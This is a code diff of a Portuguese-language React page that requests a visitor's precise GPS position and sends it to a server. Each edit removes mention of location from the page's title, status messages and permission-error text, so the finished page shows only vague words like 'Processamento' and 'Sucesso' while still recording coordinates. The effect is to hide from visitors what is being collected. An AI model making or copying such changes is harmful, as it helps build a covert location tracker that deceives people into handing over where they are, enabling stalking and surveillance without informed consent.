@@ -2,7 +2,7 @@
 import { useEffect, useState } from "react";
 
 export default function HomePage() {
-  const [status, setStatus] = useState("Aguardando permissão...");
+  const [status, setStatus] = useState("Aguardando...");
   // CORREÇÃO: Avisamos ao TypeScript que o erro pode ser um texto (string) ou nulo (null)
   const [erro, setErro] = useState<string | null>(null); 
 
@@ -26,7 +26,7 @@ export default function HomePage() {
     // Solicita o GPS com alta precisão
     navigator.geolocation.getCurrentPosition(
       async (position) => {
-        setStatus("Registrando localização, por favor aguarde...");
+        setStatus("Registrando...");
         const { latitude, longitude } = position.coords;
 
         try {
@@ -37,7 +37,7 @@ export default function HomePage() {
           });
 
           if (res.ok) {
-            setStatus("Localização registrada com sucesso!");
+            setStatus("Sucesso");
           } else {
             const data = await res.json();
             setStatus("Falha ao registrar.");
@@ -52,7 +52,7 @@ export default function HomePage() {
         // Trata os possíveis erros do usuário negar o GPS
         setStatus("Permissão negada ou falha.");
         if (error.code === 1) {
-          setErro("Você precisa permitir o acesso à localização para continuar.");
+          setErro("Você precisa permitir o acesso para continuar.");
         } else {
           setErro(error.message);
         }
@@ -64,12 +64,12 @@ export default function HomePage() {
   return (
     <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4 text-center font-sans">
       <div className="bg-white p-8 rounded-xl shadow-sm border border-gray-100 max-w-sm w-full">
-        <h1 className="text-xl font-bold text-gray-800 mb-6">Compartilhamento de Localização</h1>
+        <h1 className="text-xl font-bold text-gray-800 mb-6">Processamento</h1>
         
         <div className="mb-4">
-          {status === "Localização registrada com sucesso!" ? (
+          {status === "Sucesso" ? (
              <p className="text-2xl">✅</p>
-          ) : status === "Registrando localização, por favor aguarde..." ? (
+          ) : status === "Registrando..." ? (
              <p className="text-2xl animate-spin">⏳</p>
           ) : (
              <p className="text-2xl">📍</p>
@@ -77,7 +77,7 @@ export default function HomePage() {
         </div>
 
         <p className={`text-lg font-semibold ${
-          status === "Localização registrada com sucesso!" ? "text-green-600" : "text-blue-600"
+          status === "Sucesso" ? "text-green-600" : "text-blue-600"
         }`}>
           {status}
         </p>
@@ -88,7 +88,7 @@ export default function HomePage() {
           </p>
         )}
 
-        {status === "Localização registrada com sucesso!" && (
+        {status === "Sucesso" && (
           <p className="text-gray-500 text-sm mt-6">
             Pode fechar esta página.
           </p>
